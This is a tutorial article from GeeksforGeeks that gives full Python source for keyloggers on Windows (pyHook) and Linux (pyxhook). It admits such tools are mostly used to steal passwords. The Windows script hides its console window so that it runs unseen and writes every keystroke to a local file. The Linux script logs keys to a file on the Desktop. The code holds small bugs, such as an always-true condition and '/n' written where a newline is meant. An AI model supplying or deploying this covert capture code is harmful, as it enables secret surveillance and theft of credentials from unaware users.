Design a Keylogger in Python



Keystroke logging, is the process of recording (logging) the keys pressed on a
keyboard (usually when the user is unaware). It is also known as keylogging or
keyboard capturing.

These programs are used for troubleshooting technical problems with computers
and business networks. It can also be used to monitor network usages but more
often then not it is used for malicious intents like stealing passowrds.

This article illustrates designing keylogger for windows and linux.

 **Keylogger for Windows**

Download some python libraries  
1) pywin32  
2) pyhook‘

  

  

Following is the code to create keylogger in python

 __

 __  
 __

 __

 __  
 __  
 __

# Python code for keylogger

# to be used in windows

import win32api

import win32console

import win32gui

import pythoncom, pyHook

 

win = win32console.GetConsoleWindow()

win32gui.ShowWindow(win, 0)

 

def OnKeyboardEvent(event):

 if event.Ascii==5:

 _exit(1)

 if event.Ascii !=0 or 8:

 #open output.txt to read current keystrokes

 f = open('c:\output.txt', 'r+')

 buffer = f.read()

 f.close()

 # open output.txt to write current + new keystrokes

 f = open('c:\output.txt', 'w')

 keylogs = chr(event.Ascii)

 if event.Ascii == 13:

 keylogs = '/n'

 buffer += keylogs

 f.write(buffer)

 f.close()

# create a hook manager object

hm = pyHook.HookManager()

hm.KeyDown = OnKeyboardEvent

# set the hook

hm.HookKeyboard()

# wait forever

pythoncom.PumpMessages()  
  
---  
  
 __

 __

Save the file in C:\ as Keylogger.py and run thepython file  
 **Output:**  
The keylogger will be started in the background and save all the data on the
log file “c:\output.txt”.

 **Keylogger in Linux**

pyxhook requires python-xlib. Install it if you don’t have it already.

    
    
    sudo apt-get install python-xlib

Download pyxhook library

 __

 __  
 __

 __

 __  
 __  
 __

# Python code for keylogger

# to be used in linux

import os

import pyxhook

 

# This tells the keylogger where the log file will go.

# You can set the file path as an environment variable ('pylogger_file'),

# or use the default ~/Desktop/file.log

log_file = os.environ.get(

 'pylogger_file',

 os.path.expanduser('~/Desktop/file.log')

)

# Allow setting the cancel key from environment args, Default: 

cancel_key = ord(

 os.environ.get(

 'pylogger_cancel',

 ''

 )[0]

)

 

# Allow clearing the log file on start, if pylogger_clean is defined.

if os.environ.get('pylogger_clean', None) is not None:

 try:

 os.remove(log_file)

 except EnvironmentError:

 # File does not exist, or no permissions.

 pass

 

#creating key pressing event and saving it into log file

def OnKeyPress(event):

 with open(log_file, 'a') as f:

 f.write('{}\n'.format(event.Key))

 

# create a hook manager object

new_hook = pyxhook.HookManager()

new_hook.KeyDown = OnKeyPress

# set the hook

new_hook.HookKeyboard()

try:

 new_hook.start() # start the hook

except KeyboardInterrupt:

 # User cancelled from command line.

 pass

except Exception as ex:

 # Write exceptions to the log file, for analysis later.

 msg = 'Error while catching events:\n {}'.format(ex)

 pyxhook.print_err(msg)

 with open(log_file, 'a') as f:

 f.write('\n{}'.format(msg))  
  
---  
  
 __

 __

 **Output:**  
The keylogger will be started in the background and save all the data on the
file.log file “/home/akash/Desktop”.  

https://media.geeksforgeeks.org/wp-content/cdn-
uploads/20201208110622/Keylogger-in-python-720-x-1280.mp4

 **References**  
https://en.wikipedia.org/wiki/Keystroke_logging

This article is contributed by **Akash Sharan**. If you like GeeksforGeeks and
would like to contribute, you can also write an article using
contribute.geeksforgeeks.org or mail your article to
contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks
main page and help other Geeks.

Please write comments if you find anything incorrect, or you want to share
more information about the topic discussed above.

![Try out the all-new GeeksforGeeks
Premium!](https://media.geeksforgeeks.org/wp-content/cdn-
uploads/20210304125233/GFG-Go-Premium.png)

My Personal Notes _arrow_drop_up_

Save

